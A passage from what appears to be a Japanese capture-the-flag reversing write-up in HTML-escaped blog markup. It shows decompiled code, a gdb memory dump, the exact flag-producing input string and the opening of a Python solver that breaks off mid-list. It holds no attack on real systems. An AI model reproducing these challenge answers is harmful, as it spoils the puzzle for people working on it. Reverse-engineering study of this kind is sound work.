        &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined4 &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_555555558100 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;div &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xe&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;mod&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x2d&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;初期化された時点での&lt;code class=&quot;language-text&quot;&gt;0x555555558100&lt;/code&gt;の中身は以下のようになっていました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ x/197w 0x555555558100
0x555555558100: 0x0000002d      0x00000001      0x00000001      0x00000000
0x555555558110: 0x00000001      0x00000001      0x00000001      0x00000001
0x555555558120: 0x00000001      0x00000001      0x00000001      0x00000001
0x555555558130: 0x00000001      0x00000000      0x00000001      0x0000002a
0x555555558140: 0x00000001      0x00000000      0x00000001      0x0000002a
0x555555558150: 0x00000001      0x00000001      0x0000002a      0x00000001
0x555555558160: 0x00000001      0x0000002a      0x00000001      0x00000000
0x555555558170: 0x00000001      0x00000002      0x00000002      0x00000002&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここからもともと0x2aと0x2dが格納されているアドレス以外のアドレスをすべて抽出し、その相対オフセットを&lt;code class=&quot;language-text&quot;&gt;;&lt;/code&gt;で区切ったものを入力値として渡すことで、&lt;code class=&quot;language-text&quot;&gt;0x555555558100&lt;/code&gt;から4バイトずつ196個分の領域がすべて0x2aもしくは0x2dとなり、チェックにクリアするためFlagを取得できます。&lt;/p&gt;
&lt;p&gt;最終的にFlagを取得できる入力値は以下のようになりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;173&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;174&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;175&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;177&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;178&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;179&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;51&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;180&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;181&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;67&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;183&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;185&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;186&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;92&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;93&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;188&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;189&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;102&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;106&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;107&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;108&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;109&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;190&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;113&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;114&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;191&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;116&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;118&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;119&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;121&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;122&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;192&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;124&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;125&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;126&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;129&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;130&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;131&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;133&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;134&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;135&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;137&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;138&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;139&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;140&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;141&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;193&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;143&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;144&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;145&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;194&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;147&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;148&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;149&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;151&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;153&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;154&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;155&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;156&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;157&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;158&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;159&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;160&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;195&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;164&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;165&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;166&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;167&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;168&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;169&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;170&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;171&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ちなみに、この入力値は以下のsolverで作成しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;init_table &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0000002a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0000002a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
